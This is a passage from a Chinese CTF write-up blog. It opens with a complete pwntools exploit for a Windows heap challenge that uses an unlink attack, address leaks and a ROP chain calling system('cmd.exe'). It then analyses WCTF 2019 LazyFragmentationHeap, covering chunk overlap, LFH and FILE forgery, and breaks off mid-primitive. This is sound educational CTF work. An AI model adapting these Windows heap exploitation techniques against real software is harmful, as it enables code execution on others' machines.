class="string">'error'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process("./windowsland.exe")</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>, <span class="number">26564</span>)</span><br><span class="line"><span class="comment"># p = remote("127.0.0.1", 10000)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if len(sys.argv) == 2 and sys.argv[1] == "1":</span></span><br><span class="line"><span class="comment">#     windbgx.attach(p)</span></span><br><span class="line"></span><br><span class="line">menu = [</span><br><span class="line">    <span class="string">"create"</span>,</span><br><span class="line">    <span class="string">"edit"</span>,</span><br><span class="line">    <span class="string">"list"</span>,</span><br><span class="line">    <span class="string">"delete"</span>,</span><br><span class="line">    <span class="string">"exit"</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choose_func</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, menu[idx])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_teacher</span><span class="params">(age, name, subject)</span>:</span></span><br><span class="line">    choose_func(<span class="number">0</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"age&gt; "</span>, str(age))</span><br><span class="line">    p.sendlineafter(<span class="string">"name&gt; "</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">"What kind of human&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Which college&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"What subject&gt; "</span>, subject)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_engineer</span><span class="params">(age, name, language)</span>:</span></span><br><span class="line">    choose_func(<span class="number">0</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"age&gt; "</span>, str(age))</span><br><span class="line">    p.sendlineafter(<span class="string">"name&gt; "</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">"What kind of human&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"What salary&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Which title&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"What language&gt; "</span>, language)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_doctor</span><span class="params">(age, name, hospital)</span>:</span></span><br><span class="line">    choose_func(<span class="number">0</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"age&gt; "</span>, str(age))</span><br><span class="line">    p.sendlineafter(<span class="string">"name&gt; "</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">"What kind of human&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"How long&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Which hospital&gt; "</span>, hospital)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_athlete</span><span class="params">(age, name, sport)</span>:</span></span><br><span class="line">    choose_func(<span class="number">0</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"age&gt; "</span>, str(age))</span><br><span class="line">    p.sendlineafter(<span class="string">"name&gt; "</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">"What kind of human&gt; "</span>, <span class="string">"4"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Which country&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"What sport&gt; "</span>, sport)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_pig</span><span class="params">(age, name)</span>:</span></span><br><span class="line">    choose_func(<span class="number">0</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"age&gt; "</span>, str(age))</span><br><span class="line">    p.sendlineafter(<span class="string">"name&gt; "</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">"What kind of human&gt; "</span>, <span class="string">"5"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"How heavy&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"How tall&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Which kind&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_teacher</span><span class="params">(name, subject)</span>:</span></span><br><span class="line">    choose_func(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"What kind of human&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"name&gt; "</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">"Which subject&gt; "</span>, subject)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_engineer</span><span class="params">(name, language)</span>:</span></span><br><span class="line">    choose_func(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"What kind of human&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"name&gt; "</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">"What language&gt; "</span>, language)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_doctor</span><span class="params">(name, hospital)</span>:</span></span><br><span class="line">    choose_func(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"What kind of human&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"name&gt; "</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">"Which hospital&gt; "</span>, hospital)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_athlete</span><span class="params">(name, hospital)</span>:</span></span><br><span class="line">    choose_func(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"What kind of human&gt; "</span>, <span class="string">"4"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"name&gt; "</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">"Which hospital&gt; "</span>, hospital)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_all</span><span class="params">()</span>:</span></span><br><span class="line">    choose_func(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_teacher</span><span class="params">(name)</span>:</span></span><br><span class="line">    choose_func(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"What kind of human&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"name&gt; "</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_engineer</span><span class="params">(name)</span>:</span></span><br><span class="line">    choose_func(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"What kind of human&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"name&gt; "</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_doctor</span><span class="params">(name)</span>:</span></span><br><span class="line">    choose_func(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"What kind of human&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"name&gt; "</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_athlete</span><span class="params">(name)</span>:</span></span><br><span class="line">    choose_func(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"What kind of human&gt; "</span>, <span class="string">"4"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"name&gt; "</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_pig</span><span class="params">(name)</span>:</span></span><br><span class="line">    choose_func(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"What kind of human&gt; "</span>, <span class="string">"5"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"name&gt; "</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">()</span>:</span></span><br><span class="line">    choose_func(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_info</span><span class="params">(target_item, addr)</span>:</span></span><br><span class="line">    edit_engineer(<span class="string">"22"</span>, p64(target_item + <span class="number">0x30</span>) + p64(addr))</span><br><span class="line">    show_all()</span><br><span class="line">    p.recvuntil(<span class="string">"Engineer 23(23) was promoted as "</span>)</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">','</span>, timeout=<span class="number">1</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)[:<span class="number">8</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">            add_doctor(i, str(i), str(i))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">            add_athlete(i, str(i), str(i))</span><br><span class="line"></span><br><span class="line">        add_engineer(<span class="number">0</span>, <span class="string">"heapaddr"</span>, <span class="string">""</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">1</span>:</span><br><span class="line">                add_engineer(i, str(i), <span class="string">""</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                add_engineer(i, str(i), <span class="string">""</span>)</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">            add_teacher(i, str(i), str(i))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>, <span class="number">20</span>):</span><br><span class="line">            add_engineer(i, str(i), <span class="string">""</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>, <span class="number">27</span>):</span><br><span class="line">            add_engineer(i, str(i), str(i))</span><br><span class="line"></span><br><span class="line">        show_all()</span><br><span class="line">        p.recvuntil(<span class="string">"heapaddr"</span>)</span><br><span class="line">        heap_addr = u64(p.recvuntil(<span class="string">"(0)"</span>).replace(<span class="string">'\r\n'</span>, <span class="string">'\n'</span>)[:<span class="number">-3</span>].ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">assert</span> heap_addr != <span class="number">0</span>, <span class="string">"heap address should not be 0!"</span> </span><br><span class="line"></span><br><span class="line">        current_engineer_vector = heap_addr + <span class="number">0x8a0</span> <span class="comment"># not always right</span></span><br><span class="line">        target_item = current_engineer_vector + <span class="number">0x438</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># unlink attack</span></span><br><span class="line">        edit_engineer(<span class="string">"22"</span>, <span class="string">""</span>)</span><br><span class="line">        edit_engineer(<span class="string">"24"</span>, <span class="string">""</span>)</span><br><span class="line">        edit_engineer(<span class="string">"22"</span>, p64(target_item - <span class="number">8</span>) + p64(target_item))</span><br><span class="line">        edit_engineer(<span class="string">"21"</span>, <span class="string">""</span>) </span><br><span class="line">        </span><br><span class="line">        <span class="comment"># # use chunk 22 to control chunk 23</span></span><br><span class="line">        edit_engineer(<span class="string">"22"</span>, p64(target_item + <span class="number">0x30</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># now 22 points to itself</span></span><br><span class="line">        engineer_24_chunk = leak_info(target_item, target_item + <span class="number">0x60</span>)</span><br><span class="line">        <span class="keyword">assert</span>(engineer_24_chunk != u64(<span class="string">"Engineer"</span>)) <span class="comment"># not always success</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> len(sys.argv) == <span class="number">2</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>] == <span class="string">"1"</span>:</span><br><span class="line">            windbgx.attach(p)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="comment"># p = remote("127.0.0.1", 10000)</span></span><br><span class="line">        p = remote(<span class="string">"node3.buuoj.cn"</span>, <span class="number">26564</span>)</span><br><span class="line">        <span class="comment"># p = process("./windowsland.exe")</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fix double linked list</span></span><br><span class="line">engineer_25_chunk = leak_info(target_item, target_item + <span class="number">0x90</span>)</span><br><span class="line">chunk_size = engineer_25_chunk - engineer_24_chunk</span><br><span class="line"></span><br><span class="line">engineer_22_chunk_flink = current_engineer_vector - <span class="number">0x3a0</span></span><br><span class="line">engineer_22_chunk_blink = engineer_24_chunk</span><br><span class="line">engineer_22_chunk = current_engineer_vector + <span class="number">0x550</span> + chunk_size * <span class="number">2</span></span><br><span class="line">engineer_22_chunk_blink_blink = leak_info(target_item, engineer_22_chunk_blink + <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">edit_engineer(<span class="string">"22"</span>, p64(engineer_22_chunk_flink + <span class="number">8</span>))</span><br><span class="line">edit_engineer(<span class="string">"23"</span>, p64(engineer_22_chunk_blink))</span><br><span class="line">edit_engineer(<span class="string">"22"</span>, p64(engineer_22_chunk_blink))</span><br><span class="line">edit_engineer(<span class="string">"23"</span>, p64(engineer_22_chunk_flink) + p64(engineer_22_chunk_blink_blink))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak textaddr</span></span><br><span class="line">text_base = leak_info(target_item, target_item + <span class="number">0x68</span>) - <span class="number">0x6418</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak ntdll</span></span><br><span class="line">RtlLookupFunctionEntry_iat = text_base + <span class="number">0x6210</span></span><br><span class="line">ntdll = leak_info(target_item, RtlLookupFunctionEntry_iat) - <span class="number">0x40FB0</span> <span class="comment">#0x32BE0#</span></span><br><span class="line">ntdll_peb_addr = ntdll + <span class="number">0x151328</span> <span class="comment">#0x16a448#</span></span><br><span class="line">malloc_iat = text_base + <span class="number">0x60F0</span></span><br><span class="line">urctbase = leak_info(target_item, malloc_iat) - <span class="number">0x112A0</span> <span class="comment">#0xfda0#</span></span><br><span class="line">system = urctbase + <span class="number">0xA40C0</span> <span class="comment">#0xAE5C0#</span></span><br><span class="line">pop_rcx = urctbase + <span class="number">0x3526E</span> <span class="comment">#0x9209d#</span></span><br><span class="line">str_cmd_exe = urctbase + <span class="number">0xC80F0</span> <span class="comment">#0xD0CB0#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak peb and teb</span></span><br><span class="line">PEB = leak_info(target_item, ntdll_peb_addr) - <span class="number">0x80</span></span><br><span class="line">TEB = PEB + <span class="number">0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak stack address</span></span><br><span class="line">stack_end = (leak_info(target_item, TEB + <span class="number">0x11</span>) &lt;&lt; <span class="number">8</span>) + <span class="number">0x4000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># find where return address is stored</span></span><br><span class="line">ret_from_main = text_base + <span class="number">0x4288</span></span><br><span class="line">ret_addr_pos = stack_end - <span class="number">8</span></span><br><span class="line"><span class="keyword">while</span> ret_addr_pos &gt; stack_end - <span class="number">0x3000</span>:</span><br><span class="line">    <span class="keyword">if</span> leak_info(target_item, ret_addr_pos) == ret_from_main:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ret_addr_pos -= <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># info</span></span><br><span class="line">print(<span class="string">"[+] heap address is: "</span> + hex(heap_addr))</span><br><span class="line">print(<span class="string">"[+] current engineer vector address should be: "</span> + hex(current_engineer_vector))</span><br><span class="line">print(<span class="string">"[+] text address is: "</span> + hex(text_base))</span><br><span class="line">print(<span class="string">"[+] ntdll base is: "</span> + hex(ntdll))</span><br><span class="line">print(<span class="string">"[+] urctbase base is: "</span> + hex(urctbase))</span><br><span class="line">print(<span class="string">"[+] ntdll_peb_addr address is: "</span> + hex(ntdll_peb_addr))</span><br><span class="line">print(<span class="string">"[+] PEB address is: "</span> + hex(PEB))</span><br><span class="line">print(<span class="string">"[+] TEB address is: "</span> + hex(TEB))</span><br><span class="line">print(<span class="string">"[+] stack end address is: "</span> + hex(stack_end))</span><br><span class="line">print(<span class="string">"[+] ret_addr_pos is: "</span> + hex(ret_addr_pos))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ret_addr_pos == stack_end - <span class="number">0x3000</span>:</span><br><span class="line">    print(<span class="string">"Try again"</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write ret address</span></span><br><span class="line">edit_engineer(<span class="string">"22"</span>, p64(ret_addr_pos))</span><br><span class="line">edit_engineer(<span class="string">"23"</span>, p64(pop_rcx) + p64(str_cmd_exe) + p64(pop_rcx + <span class="number">1</span>))</span><br><span class="line">edit_engineer(<span class="string">"22"</span>, p64(ret_addr_pos + <span class="number">0x18</span>))</span><br><span class="line">edit_engineer(<span class="string">"23"</span>, p64(system))</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger</span></span><br><span class="line">quit()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="Windows-WCTF-2019-LazyFragmentationHeap"><a href="#Windows-WCTF-2019-LazyFragmentationHeap" class="headerlink" title="[Windows][WCTF 2019]LazyFragmentationHeap"></a>[Windows][WCTF 2019]LazyFragmentationHeap</h1><p>这题靶机上没有”magic.txt”，所以没法打通，因此只在本地复现了一下，学到不少东西。</p>
<h2 id="题目分析-7"><a href="#题目分析-7" class="headerlink" title="题目分析"></a>题目分析</h2><p>首先题目提供了一个菜单，常规的<code>create</code>、<code>edit</code>、<code>show</code>、<code>delete</code>一个chunk的功能，以及一个额外的<code>open</code>、<code>read</code>一个”magic.txt`文件的内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. Allocate buffer for File</span><br><span class="line">2. Edit File content</span><br><span class="line">3. Show content</span><br><span class="line">4. Clean content</span><br><span class="line">5. LazyFileHandler</span><br><span class="line">6. Exit</span><br></pre></td></tr></table></figure>
<p>需要注意的是：</p>
<ul>
<li><p>这里我把相关的结构体定义一下：</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> file_buf        struc ; (<span class="keyword">sizeof</span>=<span class="number">0x28</span>, mappedto_36)</span><br><span class="line"><span class="number">00000000</span> exist_status    dq ?</span><br><span class="line"><span class="number">00000008</span> <span class="built_in">size</span>            dq ?</span><br><span class="line"><span class="number">00000010</span> id              dq ?</span><br><span class="line"><span class="number">00000018</span> edit_status     dq ?</span><br><span class="line"><span class="number">00000020</span> <span class="built_in">buffer</span>          dq ?</span><br><span class="line"><span class="number">00000028</span> file_buf        ends</span><br></pre></td></tr></table></figure></li>
<li><p><code>create</code>限制大小在<code>0x80 ~ 0x2000</code>之间；</p>
</li>
<li><p><code>edit</code>限制同一个chunk只能进行两次，因为每次<code>edit</code>之前：</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">array</span>[v16].<span class="built_in">buffer</span></span><br><span class="line">  || <span class="built_in">array</span>[v18].edit_status != <span class="number">0xDDAABEEF1ACD</span>i64</span><br><span class="line">  || <span class="built_in">array</span>[v18].exist_status != <span class="number">0xDDAABEEF1ACD</span>i64 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Error !"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-3</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>  都会检查<code>edit_status</code>，并且<code>edit</code>之后：</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">array</span>[v18].edit_status ^= <span class="number">0xFACEB00CA4DADDAA</span>ui64;</span><br></pre></td></tr></table></figure>
<p>  都会更改这个<code>edit_status</code>，因此下次就不能再写了。</p>
<p>  但是<code>edit</code>里面存在一个典型的通过<code>strlen</code>获取写入长度的漏洞，因此可以覆盖到下一个chunk的头（6 bytes），构造chunk overlap。</p>
</li>
<li><p><code>delete</code>限制只能使用两次。</p>
</li>
<li><p><code>LazyFileHandler</code>里面<code>open</code>次数不受限制，但是<code>read</code>只能两次，但是可以任意size读（只要不超过文件大小）。</p>
</li>
</ul>
<h2 id="利用思路-7"><a href="#利用思路-7" class="headerlink" title="利用思路"></a>利用思路</h2><ol>
<li>首先<code>create</code>几个比较大的chunk，因为是在default heap上分配的，所以碎片比较多，但是size大的chunk不受影响，并且相邻： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">                        +-----------+  </span><br><span class="line">create(0x3F8, 1)  ---&gt;  |   0x400   |    </span><br><span class="line">                        +-----------+  -----</span><br><span class="line">create(0x408, 2)  ---&gt;  |   0x410   |    |</span><br><span class="line">                        +-----------+    |</span><br><span class="line">create(0x4E8, 3)  ---&gt;  |   0x4F0   |    |</span><br><span class="line">                        +-----------+  0x1000</span><br><span class="line">create(0x378, 4)  ---&gt;  |   0x380   |    |      ---&gt; to be freed </span><br><span class="line">                        +-----------+    |</span><br><span class="line">create(0x378, 5)  ---&gt;  |   0x380   |    |      ---&gt; victim chunk</span><br><span class="line">                        +-----------+  -----</span><br><span class="line">create(0x3F8, 6)  ---&gt;  |   0x400   |           ---&gt; gap</span><br><span class="line">                        +-----------+</span><br><span class="line">create(0x378, 7)  ---&gt;  |   0x380   |</span><br><span class="line">                        +-----------+</span><br><span class="line">create(0x378, 8)  ---&gt;  |   0x380   |</span><br><span class="line">                        +-----------+</span><br></pre></td></tr></table></figure></li>
<li>然后通过<code>LazyFileHandler</code>提供的<code>open</code>和<code>read</code>读取0x3F8 bytes的内容到chunk 1中，这样在<code>show</code> chunk 1的时候，可以leak出chunk 2的header，但是被encode过了；不过只要手动还原出原始头然后decode，就能得到<code>_HEAP-&gt;Encoding</code>了。</li>
<li>由于<code>edit</code>的逻辑是如果<code>strlen</code>更长的话，读入的size就变长： <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">v19 = <span class="number">-1</span>i64;</span><br><span class="line">v20 = (_BYTE *)<span class="built_in">array</span>[v18].<span class="built_in">buffer</span>;</span><br><span class="line">v21 = <span class="built_in">array</span>[v18].<span class="built_in">size</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    ++v19;</span><br><span class="line"><span class="keyword">while</span> ( v20[v19] );</span><br><span class="line"><span class="keyword">if</span> ( v19 &gt; v21 &amp;&amp; <span class="built_in">array</span>[v18].edit_status == <span class="number">0xDDAABEEF1ACD</span>i64 )</span><br><span class="line">&#123;</span><br><span class="line">    v21 = <span class="number">-1</span>i64;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">        ++v21;</span><br><span class="line">    <span class="keyword">while</span> ( v20[v21] );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">read</span>(<span class="number">0</span>, v20, v21) &lt;= <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"read error"</span>);</span><br><span class="line">    _exit(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 因此对chunk 1进行<code>edit</code>，就可以覆盖到chunk 2的header，将其size修改为0x1000即可覆盖chunk 2、3、4、5。</li>
<li>由于<code>LazyFileHandler</code>提供的<code>open</code>可以无限调用，并且每次都会申请一个0x60大小的chunk存放<code>FILE</code>结构体；再加上LFH(LowFragmentationHeap)的机制，到一定程度的时候，会开启LFH，即<br>分配一个大的chunk用作userblock（这里<a href="https://github.com/scwuaptx/LazyFragmentationHeap/blob/master/LazyFragmentationHeap_slide.pdf" target="_blank" rel="noopener">Slides</a>里面提到的大小是0x1000，可能我本机环境不同，实际上只有0x810）。<br> 然而实际调试中，先于0x60的chunk，0x20的chunk会先开启LFH，所以同样会从上面构造的0x1000的overlapped chunk中割出0x410作为userblock，这样<code>FILE</code>结构体就落在overlapped chunk + 0x410的位置了。</li>
<li>此时chunk 3的位置正好存放了一个堆地址，这是原来chunk的Flink，通过show chunk 3，我们可以得到堆地址。（这里地址会有微小的变化，从而影响了后面需要用到堆地址的部分，也造成了最后的exp概率性失败，不过成功率依然很高）。</li>
<li>既然<code>FILE</code>结构体落在chunk 3、4的空间内，由于LFH位置的不确定性，具体<code>FILE</code>落在userblock的哪个chunk里未知，但是我们可以全部填满伪造的<code>FILE</code>结构体。<br> 这里主要是要伪造<code>FILE</code>的<code>fd = 0</code>，以及<code>buffer = 0xBEEFDAD0000 + 0x28 * 5 + 0x20</code>，即第六个<code>file_buf</code>结构体的<code>buffer</code>处，从而类似于Linux下<code>_IO_FILE</code>的利用，后面调用<code>LazyFileHandler</code>提供的<code>fread_s((void *)array[v9].buffer, v10, 1ui64, v10, Stream);</code>，实际上是从标准输入中读到<code>0xBEEFDAD0000 + 0x28 * 5 + 0x20</code>这个位置，从而可以覆盖掉<code>file_buf-&gt;buffer</code>指针，达到任意地址读的功能。<br> 由于windows的特性，无论是程序本身，还是加载的dll，在一定时间内其基址都是不变的，因此虽然程序运行一次只能调用read file两次，即只能完成一次任意地址读（或写），但是可以多次运行程序读不同的地址即可。<br> 所以这里先把程序基址和ucrtbase的地址给leak出来了。</li>
<li>当然仅仅是任意地址读显然是不够得，我们得劫持程序控制流读出flag来。<br> 注意到在<code>FILE</code>所用的userblock被分配出来之后，我们之前构造的overlapped chunk仍然有0x3E0的空间留下来，而这个0x3E0的空间把chunk 5的header和Flink、Blink给overlap了。<br> 所以可以分配出这个0x3E0的chunk，修改chunk 5的header为freed状态，以及修改Flink和Blink满足unlink check，再free chunk 4完成unlink attack，在<code>0xBEEFDAD0000 + 0x28 * 4 + 0x20</code>写入了一个指向本身的指针。<br> 另外，由于chunk 5本身是没有在Freelist或者ListHints中的，所以这些链表都没有corruption，只是可能存在被overlapped的LFH userblock被破坏了的问题，不过不影响后续的利用。</li>
<li>完成上述利用之后，我们可以构造出这样的primitive： <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">file_buf[<span class="number">6</span>]-&gt;<span class="built_in">buffer</span> = &amp;file_buf[<span class="number">6</span>]-&gt;edit_status; </span><br><span class="line"><span class="comment">// then use chunk 6 to edit</span></span><br><span class="line">file_buf[<span class="number">7</span>]-&gt;edit_status = <span class="number">0xDDAABEEF1ACD</span>;</span><br><span class="line">file_buf[<span class="number">7</span>]-&gt;<span class="built_in">buffer</span> = arbitrary_addr;</span><br><span class="line">file_buf[<span class="number">8</span>]-&gt;edit_status = <span class="number">00</span>xDDAABEEF1ACD;</span><br><span class="line">file_buf[<span class="number">8</span>]-&gt;<span class="built_in">buffer</span> = &amp;file_buf[<span class="number">6</span>]-&gt;edit_status;</span><br><span class="line"><span class="comment">// then use chunk 7 to arbitrary read or write</span></span><br><span class="line">....</span><br><span class="line"><span class="comment">// then use chunk 8 to edit, make chunk 6 can edit again</span></span><br><span class="line">file_buf[<span class="number">6</span>]-&gt;<span class="built_in">buffer</span> = &amp;file_buf[<span class="number">6</span>]-&gt;edit_status; </span><br><span class="line">file_buf[<span class="number">6</span>]-&gt;edit_status = <span class="number">00</span>xDDAABEEF1ACD;</span><br></pre></td></tr></table></figure>
